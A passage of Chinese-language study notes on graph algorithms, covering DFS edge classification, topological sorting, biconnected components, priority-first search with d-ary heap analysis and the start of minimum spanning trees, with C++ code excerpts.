class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">default</span>: <span class="comment">//u已访问完毕（VISITED，有向图），则视承袭关系分为前向边或跨边</span></span><br><span class="line">            type ( v, u ) = ( dTime ( v ) &lt; dTime ( u ) ) ? FORWARD : CROSS; <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   status ( v ) = VISITED; fTime ( v ) = ++clock; <span class="comment">//至此，当前顶点v方告访问完毕</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过显式地维护一个栈结构，动态记录从起始顶点到当前顶点通路上地各个顶点，其中栈顶对应于当前顶点。每当遇到<code>undiscovered</code>状态顶点，并令其入栈，一旦当前顶点的所有邻居都不再处于<code>undiscovered</code>状态，则将其转为<code>visited</code>状态，并令其出栈。</p>
<p><strong>边的分类</strong></p>
<p>每一递归实例中，先将当前节点标记为<code>discovered</code>状态，再递归地对其邻居递归处理，待所有邻居处理完毕之后再将顶点$v$置为<code>visited</code>状态，便可回溯。</p>
<p>若顶点$u$为<code>undiscovered</code>状态，则将边$(v,u)$归纳为树边。</p>
<p>若顶点$u$处于<code>discovered</code>状态，则发现一个有向环路，此时，在DFS遍历树中，$u$必为$v$的祖先，应将边$(v,u)$归纳为后向边。</p>
<p>这里为每个顶点都记录了被发现的顶点和访问完成的时刻，对应的时间$[dTime(v),fTime(v)]$称为$v$的活跃期。</p>
<p>对于有向图，顶点$v$还可能处于<code>visited</code>状态，此时通过对比$v$和$u$活跃期，即可判定$v$是否为$u$的祖先，若是，则边$(v,u)$应为前向边，否则，二者必定来自不同的分支，边$(v,u)$应归类为跨边。</p>
<p>此处需特别注意，无向图只有后向边(不区分)，没有跨边和前向边。</p>
<blockquote>
<p>顶点$v$是$u$的祖先，当且仅当$[dTime(u),fTime(u)] \subseteq  [dTime(v),fTime(v)]$</p>
</blockquote>
<p>先证明仅当，若$v$为$u$的祖先，则遍历过程的次序应该是</p>
<ol>
<li>$v$被发现</li>
<li>$u$被发现</li>
<li>$u$访问完成</li>
<li>$v$访问完成</li>
</ol>
<p>也就是说，$u$的活跃期包含于$v$的活跃期中，在任一顶点刚被发现的时候，其每个后代顶点$u$都应处于<code>undiscovered</code>状态。</p>
<p>反之，若$u$包含于$v$的活跃期中，则意味着当$u$被发现(由<code>discovered</code>状态转入<code>discovered</code>状态，$v$应该正处于<code>discovered</code>状态。因此，$v$既不可能与$u$处于不同的分支，又不可能是$u$的后代，故当亦成立。</p>
<p>由以上分析可进一步看出，此类顶点活跃期之间是严格的包含关系。</p>
<blockquote>
<p>$v$和$u$无承袭关系，当且仅当二者的活跃期无交集</p>
</blockquote>
<p>当必然成立，只需证明仅当</p>
<p>考察没有承袭关系的顶点$v$和$u$，不妨设$dTime[u]&lt;dTime[v]$，则$fTime[u]&lt;dTime[v]$</p>
<p>若不然($dTime(u)&lt;fTime(u)$),则意味着当$u$被发现时，$v$应该仍处于<code>discovered</code>状态。此时必然有一条从$v$到$u$的路径，沿途的节点都处于<code>visited</code>状态，在DFS的函数调用栈中，沿途各节点依次分别存有一帧。在DFS树中，该路径上的每一条边都对应于一对父子节点，故说明$u$是$v$的后代，与假设矛盾。</p>
<blockquote>
<p>起始于顶点$s$的DFS搜索过程中的某时刻，设当前节点为$v$，任一顶点$u$处于discovered状态，当且仅当$u$来自s通往$v$的路径沿途，或者等效地，在DFS树中$u$必定为$v$的祖先</p>
</blockquote>
<p>由条件可知$dTime(u)&lt;dTime(v)&lt;fTime(u)$</p>
<p>由以上节点活跃期之间相互包含关系的结论，必有：</p>
<p>$dTime(u)&lt;dTime(v)&lt;fTime(v)&lt;fTime(u)$</p>
<p>则$[dTime(v),fTime(v)] \subseteq  [dTime(u),fTime(u)]$,$u$必定为$v$的祖先。</p>
<p>由以上规律可知，起始顶点$s$既是第一个转入<code>discovered</code>状态的，也是最后一个转入<code>visited</code>状态的，其活跃期贯穿整个DFS算法的始末，在此期间的任何一个时刻，任何顶点处于<code>discovered</code>状态，当且仅当它属于从起始顶点$s$到当前顶点$v$的通路上。</p>
<h2 id="应用-1"><a href="#应用-1" class="headerlink" title="应用"></a>应用</h2><p>从顶点$s$出发的深度优先搜索：</p>
<ul>
<li>在无向图中将访问与$s$联通的所有顶点</li>
<li>在有向图中将访问由$s$可达的所有顶点</li>
</ul>
<table>
<thead>
<tr>
<th>联通图的支撑树</th>
<th>DFS/BFS</th>
</tr>
</thead>
<tbody><tr>
<td>非联通图的支撑森林</td>
<td>DFS/BFS</td>
</tr>
<tr>
<td>联通性检测</td>
<td>DFS/BFS</td>
</tr>
<tr>
<td>无向环路检测</td>
<td>DFS/BFS</td>
</tr>
<tr>
<td>有向环路检测</td>
<td>DFS</td>
</tr>
<tr>
<td>顶点之间可达性检测/路径求解</td>
<td>DFS/BFS</td>
</tr>
<tr>
<td>顶点之间的最短距离</td>
<td>BFS</td>
</tr>
<tr>
<td>直径</td>
<td>DFS</td>
</tr>
<tr>
<td>Eulerian tour</td>
<td>DFS</td>
</tr>
<tr>
<td>拓扑排序</td>
<td>DFS</td>
</tr>
<tr>
<td>双联通分量、强联通分量分解</td>
<td>DFS</td>
</tr>
</tbody></table>
<p><strong>欧拉环路问题</strong></p>
<p>在$O(n+e)$时间内判断任一无向图是否存在欧拉环路，并且在存在时构造出一条欧拉环路</p>
<p>根据图论的基本结论，只需遍历全图确定其连通性，再核对各顶点的度数。若连通且没有奇度数的顶点，则必然存在欧拉环路。若其中奇度数的顶点存在两个，则恰有两个，则必然存在以这两个顶点为起点和终点的欧拉环路。</p>
<p>构造欧拉环路的一种算法：从任一顶点出发做一趟DFS，依次记录沿途经过的各边并随即从图中删除，一旦有顶点度数归零，则随即将其删除。每当回到起点，则得到一条欧拉环路。此时若还存在已访问但是还未删除的顶点，则任选其一并从它出发再做一趟DFS,过程相同。每次所新得的子环路，都需要在搜索的起始点处与此前的环路合并为一条更大的子环路。最终不剩任何顶点的时候，算法结束，当前的子环路即为原图的一条欧拉环路。</p>
<h1 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h1><p>在具体情景中，有如下问题：</p>
<ul>
<li>给定项目工程图，是否存在可串行施工的方案？</li>
<li>email系统中，是否存在自动转发或回复的回路</li>
</ul>
<p>在图论中，拓扑排序是一个有向图所有顶点的线性序列，该序列必须满足以下两个条件：</p>
<ul>
<li>每个顶点出现且仅出现一次</li>
<li>若存在一条从顶点A到顶点B的路径，那么在序列中顶点A出现在顶点B的前面</li>
</ul>
<p>那么拓扑排序是否必然存在？</p>
<p>教材中偏序和全序的定义为：</p>
<ul>
<li>偏序：集合内只有部分元素在这个关系中是可以比较的</li>
<li>全序：任何一对元素均是可以比较的</li>
</ul>
<p>对于有向无环图，任意两个顶点之间的关系要么是确定的(存在先后关系)，要么是不确定的(不存在先后关系)，绝对不存在互相矛盾的关系(即环路)，以上即有向无环图。抽象而言，有向无环图两个顶点之间不存在环路，至于联通与否无所谓，所以有向无环图必然满足偏序关系。</p>
<p>所谓全序，就是在偏序的基础上，有向无环图的任一顶点之间均有明确的关系。用图来表示，即单向联通。可见，全序就是偏序的特殊情况。</p>
<p>拓扑排序并不唯一，交换某些节点后仍然为拓扑排序。若有向图中存在环路，则必然不可能存在拓扑排序。反之，对于有向无环图，即不含环路的有向图必然存在拓扑排序。有向无环图对应偏序关系，而拓扑排序为全序关系。在顶点数目有限时，与某一偏序相容的全序必然存在。</p>
<h2 id="零入度"><a href="#零入度" class="headerlink" title="零入度"></a>零入度</h2><p>有限偏序集必有极大/极大元素，任何有向无环图都存在一种拓扑排序。</p>
<p>极大元素即该元素不小于偏序集的任何其他元素，即在偏序集中是极大的。极大元素并不只是大小关系，有向无环图中的极大，其实就是在这个偏序集中不存在第二个元素可以使得它作为被处理的关系，即关系的受者。这样的元素称为该偏序集的极大元素。</p>
<p><strong>存在性</strong></p>
<ol>
<li>任何DAG，必有(至少一个)顶点入度为0，记作m</li>
<li>若DAG\{M}存在拓扑排序，则$S=&lt;u_{k1}…,u_{k(n-1)}&gt;$,则$S’=&lt;m,u_{k1}…,u_{k(n-1)}&gt;$ 即为DAG的拓扑排序。</li>
<li>只要$m$不唯一，则拓扑排序也应不唯一</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将所有零入度的顶点存入栈&#x2F;&#x2F;O(n)</span><br><span class="line">取空队列Q&#x2F;&#x2F;记录拓扑排序序列</span><br><span class="line">while(!S.empty())&#123;&#x2F;&#x2F;O(n)</span><br><span class="line">    Q.enqueue(v&#x3D;S.pop);&#x2F;&#x2F;栈顶顶点转入队列Q</span><br><span class="line">    for each edge(v,u)&#x2F;&#x2F;凡入度为1(经节点删除后入度为0)者，均压入栈中</span><br><span class="line">     if(inDegree(u)&lt;2) S.push(u);</span><br><span class="line">    G&#x3D;G\&#123;v&#125;;&#x2F;&#x2F;删除顶点v和其关联边</span><br><span class="line">&#125;</span><br><span class="line">return |G|:&quot;not DAG&quot;:Q;</span><br></pre></td></tr></table></figure>
<p>残留的G空，当且仅当原图可拓扑排序。</p>
<p>栈S和队列Q的初始化共需$O(n)$时间，主体迭代共计迭代$O(n)$步，其中涉及的操作无非以下五类：</p>
<ul>
<li>出、入栈，共计$O(n)$次</li>
<li>入队，共计$O(n)$次</li>
<li>递减邻接矩阵的入度，共计$O(e)$次</li>
<li>删除零入度顶点，共计$O(n)$ 个</li>
<li>删除关联边，累计$O(e)$个</li>
</ul>
<p>以上操作均为基本操作，故时间复杂度为$O(n+e)$</p>
<p>空间方面，除了原图本身，引入了辅助栈和辅助队列，分别用以存放零入度顶点和排序序列，无论是S还是Q，每个顶点在其中最多存放一份，故二者的规模始终不超过$O(n)$。进一步可以发现，二者在任何时刻都不可能有公共顶点，S弹出节点并随即并入Q,故二者总体所占的空间为$O(n)$。</p>
<h2 id="零出度"><a href="#零出度" class="headerlink" title="零出度"></a>零出度</h2><p>将关注点转至与极大顶点对称的极小顶点，同理，有限偏序集中也必然极小元素(同样，未必唯一)。该元素作为顶点，出度必然为0。在DFS搜索中，首先因访问完成而转至<code>visited</code>状态的顶点m必然具有此性质。根据DFS搜索的特性，顶点m(及其关联边)对此后的搜索过程不起作用。于是下一转至visited状态的节点可等效理解为剔除m后出度为0者。DFS搜索过程中各个顶点被标记为<code>visited</code>的顺序恰好按照逆序给出了原图的一个拓扑排序。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Tv, <span class="keyword">typename</span> Te&gt; <span class="comment">//基于DFS的拓扑排序算法</span></span><br><span class="line">Stack&lt;Tv&gt;* Graph&lt;Tv, Te&gt;::tSort ( <span class="keyword">int</span> s ) &#123; <span class="comment">//assert: 0 &lt;= s &lt; n</span></span><br><span class="line">   reset(); <span class="keyword">int</span> clock = <span class="number">0</span>; <span class="keyword">int</span> v = s;</span><br><span class="line">   Stack&lt;Tv&gt;* S = <span class="keyword">new</span> Stack&lt;Tv&gt;; <span class="comment">//用栈记录排序顶点</span></span><br><span class="line">   <span class="keyword">do</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> ( UNDISCOVERED == status ( v ) )</span><br><span class="line">         <span class="keyword">if</span> ( !TSort ( v, clock, S ) ) &#123; <span class="comment">//clock并非必需</span></span><br><span class="line">            <span class="keyword">while</span> ( !S-&gt;empty() ) <span class="comment">//任一连通域（亦即整图）非DAG</span></span><br><span class="line">               S-&gt;pop(); <span class="keyword">break</span>; <span class="comment">//则不必继续计算，故直接返回</span></span><br><span class="line">         &#125;</span><br><span class="line">   &#125; <span class="keyword">while</span> ( s != ( v = ( ++v % n ) ) );</span><br><span class="line">   <span class="keyword">return</span> S; <span class="comment">//若输入为DAG，则S内各顶点自顶向底排序；否则（不存在拓扑排序），S空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Tv, <span class="keyword">typename</span> Te&gt; <span class="comment">//基于DFS的拓扑排序算法（单趟）</span></span><br><span class="line"><span class="keyword">bool</span> Graph&lt;Tv, Te&gt;::TSort ( <span class="keyword">int</span> v, <span class="keyword">int</span>&amp; clock, Stack&lt;Tv&gt;* S ) &#123; <span class="comment">//assert: 0 &lt;= v &lt; n</span></span><br><span class="line">   dTime ( v ) = ++clock; status ( v ) = DISCOVERED; <span class="comment">//发现顶点v</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> u = firstNbr ( v ); <span class="number">-1</span> &lt; u; u = nextNbr ( v, u ) ) <span class="comment">//枚举v的所有邻居u</span></span><br><span class="line">      <span class="keyword">switch</span> ( status ( u ) ) &#123; <span class="comment">//并视u的状态分别处理</span></span><br><span class="line">         <span class="keyword">case</span> UNDISCOVERED:</span><br><span class="line">            parent ( u ) = v; type ( v, u ) = TREE;</span><br><span class="line">            <span class="keyword">if</span> ( !TSort ( u, clock, S ) ) <span class="comment">//从顶点u处出发深入搜索</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//若u及其后代不能拓扑排序（则全图亦必如此），故返回并报告</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> DISCOVERED:</span><br><span class="line">            type ( v, u ) = BACKWARD; <span class="comment">//一旦发现后向边（非DAG），则</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//不必深入，故返回并报告</span></span><br><span class="line">         <span class="keyword">default</span>: <span class="comment">//VISITED (digraphs only)</span></span><br><span class="line">            type ( v, u ) = ( dTime ( v ) &lt; dTime ( u ) ) ? FORWARD : CROSS;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   status ( v ) = VISITED; S-&gt;push ( vertex ( v ) ); <span class="comment">//顶点被标记为VISITED时，随即入栈</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//v及其后代可以拓扑排序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>额外引入的栈复杂度不超过顶点总数$O(n)$ ,总体而言，空间复杂度与基本深度优先算法一致，为$O(n + e)$。</p>
<p>递归跟踪过程与标准DFS过程一致，为$O(n+e)$。 </p>
<h1 id="双联通域分解"><a href="#双联通域分解" class="headerlink" title="双联通域分解"></a>双联通域分解</h1><p>若无向图删除顶点$v$以后G包含的联通域增多，则$v$被称为关节点。如何找出图中所有关节点呢？</p>
<p><strong>蛮力算法</strong></p>
<ol>
<li>通过BFS或DFS统计出图G包含的联通域数目</li>
<li>逐一枚举各个顶点，暂时将其从图中删去</li>
<li>统计出图G\{v}所含的联通域数目</li>
</ol>
<p>于是,$v$为关节点当且仅当图G\{v}的联通域数目大于图G。</p>
<p>时间复杂度为$O(n(n+e))$</p>
<p><strong>可行算法</strong></p>
<p>DFS树的根节点若至少有两个分支，必定为关节点，无向图不存在跨边，所以根节点的两个分支无法通过跨边相连，去除根节点后联通域数目必然增加。若根节点只有一个分支，则不可能为根节点，叶节点绝不可能是关节点。</p>
<p>考查一般的内部节点$c$，若节点$c$的移除导致某一棵真子树和真祖先无法联通，则$c$必定为关节点。反之，若所有子树均可以与$c$的某一祖先联通，则$c$就不可能是关节点。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Tv, <span class="keyword">typename</span> Te&gt; <span class="keyword">void</span> Graph&lt;Tv, Te&gt;::bcc ( <span class="keyword">int</span> s ) &#123; <span class="comment">//基于DFS的BCC分解算法</span></span><br><span class="line">   reset(); <span class="keyword">int</span> clock = <span class="number">0</span>; <span class="keyword">int</span> v = s; Stack&lt;<span class="keyword">int</span>&gt; S; <span class="comment">//栈S用以记录已访问的顶点</span></span><br><span class="line">   <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">if</span> ( UNDISCOVERED == status ( v ) ) &#123; <span class="comment">//一旦发现未发现的顶点（新连通分量）</span></span><br><span class="line">         BCC ( v, clock, S ); <span class="comment">//即从该顶点出发启动一次BCC</span></span><br><span class="line">         S.pop(); <span class="comment">//遍历返回后，弹出栈中最后一个顶点——当前连通域的起点</span></span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">while</span> ( s != ( v = ( ++v % n ) ) );</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> hca(x) (fTime(x)) <span class="comment">//利用此处闲置的fTime[]充当hca[]</span></span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Tv, <span class="keyword">typename</span> Te&gt; <span class="comment">//顶点类型、边类型</span></span><br><span class="line"><span class="keyword">void</span> Graph&lt;Tv, Te&gt;::BCC ( <span class="keyword">int</span> v, <span class="keyword">int</span>&amp; clock, Stack&lt;<span class="keyword">int</span>&gt;&amp; S ) &#123; <span class="comment">//assert: 0 &lt;= v &lt; n</span></span><br><span class="line">   hca ( v ) = dTime ( v ) = ++clock; status ( v ) = DISCOVERED; S.push ( v ); <span class="comment">//v被发现并入栈</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> u = firstNbr ( v ); <span class="number">-1</span> &lt; u; u = nextNbr ( v, u ) ) <span class="comment">//枚举v的所有邻居u</span></span><br><span class="line">      <span class="keyword">switch</span> ( status ( u ) ) &#123; <span class="comment">//并视u的状态分别处理</span></span><br><span class="line">         <span class="keyword">case</span> UNDISCOVERED:</span><br><span class="line">            parent ( u ) = v; type ( v, u ) = TREE; BCC ( u, clock, S ); <span class="comment">//从顶点u处深入</span></span><br><span class="line">            <span class="keyword">if</span> ( hca ( u ) &lt; dTime ( v ) ) <span class="comment">//遍历返回后，若发现u（通过后向边）可指向v的真祖先</span></span><br><span class="line">               hca ( v ) = min ( hca ( v ), hca ( u ) ); <span class="comment">//则v亦必如此</span></span><br><span class="line">            <span class="keyword">else</span> &#123; <span class="comment">//否则，以v为关节点（u以下即是一个BCC，且其中顶点此时正集中于栈S的顶部）</span></span><br><span class="line">               <span class="keyword">do</span> &#123; </span><br><span class="line">                  temp.push ( S.pop() ); print ( vertex ( temp.top() ) ); </span><br><span class="line">               &#125; <span class="keyword">while</span> ( v != temp.top() ); </span><br><span class="line">               <span class="keyword">while</span> ( !temp.empty() ) S.push ( temp.pop() );</span><br><span class="line">               <span class="keyword">while</span> ( v != S.pop() ); <span class="comment">//依次弹出当前BCC中的节点，亦可根据实际需求转存至其它结构</span></span><br><span class="line">               S.push ( v ); <span class="comment">//最后一个顶点（关节点）重新入栈——分摊不足一次</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> DISCOVERED:</span><br><span class="line">            type ( v, u ) = BACKWARD; <span class="comment">//标记(v, u)，并按照“越小越高”的准则</span></span><br><span class="line">            <span class="keyword">if</span> ( u != parent ( v ) ) hca ( v ) = min ( hca ( v ), dTime ( u ) ); <span class="comment">//更新hca[v]</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">default</span>: <span class="comment">//VISITED (digraphs only)</span></span><br><span class="line">            type ( v, u ) = ( dTime ( v ) &lt; dTime ( u ) ) ? FORWARD : CROSS;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   status ( v ) = VISITED; <span class="comment">//对v的访问结束</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于处理的是无向图，在顶点$v$的孩子$u$处返回后，通过比较$hca[u]$与$dTime[v]$的大小，即可判断是否为关节点。</p>
<ul>
<li>若若$hca[u] \geq dTime[v]$,则说明u的后代无法通过后向边与v的真祖先联通，故v为关节点。</li>
<li>若$hca[u] &lt; dTime[v]$，则意味着u可经由后向边连通至v的真祖先。</li>
</ul>
<p>每次遇到一条后向边，也将$hca[v]$更新为$hca[v]$和$dTime[u]$之间的小者，以保证顶点v可以始终记录顶点v可由后向边向上联通的最小祖先。</p>
<p>额外引入的栈复杂度不超过顶点总数$O(n)$ ,总体而言，空间复杂度与基本深度优先算法一致，为$O(n + e)$。</p>
<p>时间方面，尽管同一节点可能多次入栈，但是每次入栈都对应于一个新发现的连通域，与之对应地必有至少另一顶点出栈并不再入栈，此类重复入栈操作不超过n次，入栈操作累计不超过2n次，为$O(n+e)$。 </p>
<h1 id="优先级搜索"><a href="#优先级搜索" class="headerlink" title="优先级搜索"></a>优先级搜索</h1><p>各图搜索算法的差异，主要体现为每一步迭代对新顶点的选取策略不同，比如，BFS优先考查更早被发现的顶点，而DFS搜索优先考查最后被发现的顶点。每一种选取策略等效于给所有顶点赋予不同的优先级，而且随着算法的运行不断调整，每一步迭代所选取的节点都为当时优先级最高者。所以可以引入统一的框架，鉴于优先级在其中的关键角色，称为优先级搜索。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Tv, <span class="keyword">typename</span> Te&gt; <span class="keyword">template</span> &lt;<span class="keyword">typename</span> PU&gt; <span class="comment">//优先级搜索（全图）</span></span><br><span class="line"><span class="keyword">void</span> Graph&lt;Tv, Te&gt;::pfs ( <span class="keyword">int</span> s, PU prioUpdater ) &#123; <span class="comment">//assert: 0 &lt;= s &lt; n</span></span><br><span class="line">   reset(); <span class="keyword">int</span> v = s; <span class="comment">//初始化</span></span><br><span class="line">   <span class="keyword">do</span> <span class="comment">//逐一检查所有顶点</span></span><br><span class="line">      <span class="keyword">if</span> ( UNDISCOVERED == status ( v ) ) <span class="comment">//一旦遇到尚未发现的顶点</span></span><br><span class="line">         PFS ( v, prioUpdater ); <span class="comment">//即从该顶点出发启动一次PFS</span></span><br><span class="line">   <span class="keyword">while</span> ( s != ( v = ( ++v % n ) ) ); <span class="comment">//按序号检查，故不漏不重</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Tv, <span class="keyword">typename</span> Te&gt; <span class="keyword">template</span> &lt;<span class="keyword">typename</span> PU&gt; <span class="comment">//顶点类型、边类型、优先级更新器</span></span><br><span class="line"><span class="keyword">void</span> Graph&lt;Tv, Te&gt;::PFS ( <span class="keyword">int</span> s, PU prioUpdater ) &#123; <span class="comment">//优先级搜索（单个连通域）</span></span><br><span class="line">   priority ( s ) = <span class="number">0</span>; status ( s ) = VISITED; parent ( s ) = <span class="number">-1</span>; <span class="comment">//初始化，起点s加至PFS树中</span></span><br><span class="line">   <span class="keyword">while</span> ( <span class="number">1</span> ) &#123; <span class="comment">//将下一顶点和边加至PFS树中</span></span><br><span class="line">      <span class="keyword">for</span> ( <span class="keyword">int</span> w = firstNbr ( s ); <span class="number">-1</span> &lt; w; w = nextNbr ( s, w ) ) <span class="comment">//枚举s的所有邻居w</span></span><br><span class="line">         prioUpdater ( <span class="keyword">this</span>, s, w ); <span class="comment">//更新顶点w的优先级及其父顶点</span></span><br><span class="line">      <span class="keyword">for</span> ( <span class="keyword">int</span> shortest = INT_MAX, w = <span class="number">0</span>; w &lt; n; w++ )</span><br><span class="line">         <span class="keyword">if</span> ( UNDISCOVERED == status ( w ) ) <span class="comment">//从尚未加入遍历树的顶点中</span></span><br><span class="line">            <span class="keyword">if</span> ( shortest &gt; priority ( w ) ) <span class="comment">//选出下一个</span></span><br><span class="line">               &#123; shortest = priority ( w ); s = w; &#125; <span class="comment">//优先级最高的顶点s</span></span><br><span class="line">      <span class="keyword">if</span> ( VISITED == status ( s ) ) <span class="keyword">break</span>; <span class="comment">//直至所有顶点均已加入</span></span><br><span class="line">      status ( s ) = VISITED; type ( parent ( s ), s ) = TREE; <span class="comment">//将s及与其父的联边加入遍历树</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125; <span class="comment">//通过定义具体的优先级更新策略prioUpdater，即可实现不同的算法功能</span></span><br></pre></td></tr></table></figure>
<p>PFS搜索由两重循环构成，其中内层循环又由并列的两层循环构成，前一循环的累计时间应取决于所有顶点的出度总和，即$O(e)$,后一循环固定迭代$n$次，累计$O(n^2)$时间，二者合计总体复杂度$O(n^2)$ 。</p>
<p>PFS中的各顶点可组织为优先级队列的形式，为此需要使用优先级队列接口：</p>
<ul>
<li>由$n$个顶点创建初始优先级队列，累计$ O(n)$</li>
<li>取优先级最高的跨边$(u,w)$，累计$ O(nlogn)$</li>
<li>更新所有关联节点到U的距离，提高优先级,共计$ O(elogn)$</li>
</ul>
<p>总体运行时间=$O((n+e)logn)$</p>
<p>对于稀疏图，处理效率很高，对于稠密图，反而不如常规实现的版本。</p>
<p>若将二叉堆改为多叉堆，则堆高降至$O(log_dn)$。</p>
<p>上滤成本降低至$log_dn$,但是下滤成本$\displaystyle dlog_dn&gt;d\frac{ln2}{lnd}log_2n$</p>
<p>对于稠密图，两次操作差距悬殊，如此：</p>
<p>PFS的运行时间为$ndlog_dn+elog_dn=(nd+e)log_dn$</p>
<p>令$\displaystyle f(x)=(nx+e)\frac{lnn}{lnx}$</p>
<p>$\displaystyle f’(x)=n \frac{lnn}{lnx}-(nx+e)\frac{lnn}{x{ln^2x}}$</p>
<p>$h(x)=nlnx(1+lnx)-(nx+e)lnn$</p>
<p>$h’(x)=nlnn(1+lnx)-nlnn=nlnnlnx&gt;0$</p>
<p>令$h(x)=0$，即$\displaystyle nlnn(xlnx-x)=elnn$</p>
<p>即$xlnx-x=e/n$的解，根据matlab求解得，</p>
<p>$e/(n<em>lambertw(0, (e</em>exp(-1))/n))$</p>
<p><a href="https://en.wikipedia.org/wiki/Lambert_W_function">lambertw</a>，大致取$d=e/n+2$时，总体性能最优$O(elog_{e/n+2}n)$ </p>
<p>两相权衡，大致取$d=e/n+2$时，总体性能最优$O(elog_{e/n+2}n)$</p>
<p>对稀疏图保持高效，$elog_{e/n+2}\approx nlog_{n/n+2}n=O(nlogn)$</p>
<p>对稠密图改进极大，$elog_{e/n+2}n \approx n^2log_{n^2+n}n \approx n^2=O(e)$</p>
<p>对于一般的图，可以自适应地实现最优。</p>
<h1 id="最小支撑树"><a href="#最小支撑树" class="headerlink" title="最小支撑树"></a>最小支撑树</h1><p>连通图G的某一无环联通子图T若覆盖G中的所有顶点，则称作G的一棵支撑树或生成树。</p>
<p>支撑树<code>/spanning</code>即为覆盖N中所有顶点</p>
<p>树，则具有以下性质：</p>
<ul>
<li>连通且无环，$|V|=|F|+1$</li>
<li>再添加一条边形成环路，再删除同环的一条边恢复为树</li>
<li>删除一条边后不再连通，再添加联边恢复为树</li>
</ul>
<p>同一网络的最小支撑树并不唯一。</p>
<p>若图$G$为一带权网络，则每一棵支撑树的成本即为其所采用各边权重的总和。在G的所有支撑树中，成本最低者称作最小支撑树。</p>
<h2 id="具体应用"><a href="#具体应用" class="headerlink" title="具体应用"></a>具体应用</h2><p>聚类分析、网络架构设计、VLSI布线设计等诸多实际应用问题可转化为最小支撑树的构造问题。在这些应用中，边的权重大多对应于某种可量化的成本，可作为对应优化问题的基本模型，同时最小支撑树构造算法也可以为一些NP问题提供足够快速、足够接近的近似解法。</p>
<p>例如哈密顿环路(经过每个顶点刚好一次)问题，在任意n个城市的所有哈密顿环路中，找出交通成本最低者。</p>
<p>若已经构造出对应的最小支撑数，可在$O(n)$时间内找出一条哈密尔顿环路，其交通成本不超过最优成本的两倍</p>
<h2 id="蛮力算法"><a href="#蛮力算法" class="headerlink" title="蛮力算法"></a>蛮力算法</h2><p>由最小生成树的定义，蛮力算法大致如下：</p>
<ul>
<li>逐一枚举G的所有生成树，从而挑选其中的最低者</li>
</ul>
<blockquote>
<p>n个互异顶点构成的图，可能有多少支撑树？</p>
</blockquote>
<p><a href="https://en.wikipedia.org/wiki/Cayley's_formula#Generalizations">Cayley公式</a>：联接n个互异顶点的树有$n^{n-2}$棵，或等价地，完全图$k_n$有$n^{n-2}$棵支撑树。</p>
<h2 id="prim算法"><a href="#prim算法" class="headerlink" title="prim算法"></a>prim算法</h2><p>图$G=(V;E)$中，顶点集$V$的任一平凡子集$U$及其补集$V/U$都构成$G$的一个割，记作$(U;V/U)$。若边$uv$满足$u \in U$且$v\notin U$,则称作该割的一条跨越边。因此类边联接于V和其补集之间。</p>
<p>先假定各节边的权重互异，退化情况同样可证</p>
<p>prim算法的正确性基于以下事实：<strong>最小支撑树总是会采用联接每一割的最短跨越边</strong>。</p>
<p>反证：假设$(u,v)$未被任何MST采用</p>
<p>任取一棵MST,不妨命名为$T$,将$(u,v)$​加入其中，于是将出现唯一的回路，该回路必将经过$(u,v)$以及至少另一跨边$(s,t)$(若不存在跨边则二者必然不连通)，再删除边$st$则该环路必将消失。转换后的子树$T’$仍然为连通图，$T$和$T’$二者的差异仅在于边$uv$和边$st$,故二者成本之差即是这两条边的权重之差。不难看出，边$st$的权重必然大于身为最短跨越边的$uv$，故$T’$的总体权重小于$T$，这与$T$总体权重最小的前提矛盾。</p>
<p>反之，<strong>N的任一MST必然通过极短跨边联接每一割</strong></p>
<blockquote>
<p>G的每棵极小支撑树中的每一条边，必然为某一割的极短跨越边</p>
</blockquote>
<p>任取$G$的一棵极小支撑树$T$，考查其中的任何一条树边$uv$。将该边删除之后，$T$应恰好被分成两棵子树，它们对应的两个顶点子集也构成G的一个割$(U:V/U)$。</p>
<p>实际上，$uv$必然是该割的极短跨越边之一，否则将其替换为一条极短跨边，则可得到一棵权重更小的树。</p>
<p>以下方法可由现有某一图最小支撑树导出该图添加一边后的最小支撑树</p>
<p>设$T$为$N$的一棵MST，在$N$中添加边$e$后得到$N’$</p>
<p>若：沿着$e$在$T$中对应的环路，$f$为一极长边，则$T-{f}+{e}$即为$N’$的一棵MST</p>
<p>此时，$f=e,T-{f}+{e}=T$即为$N’$的MST</p>
<ul>
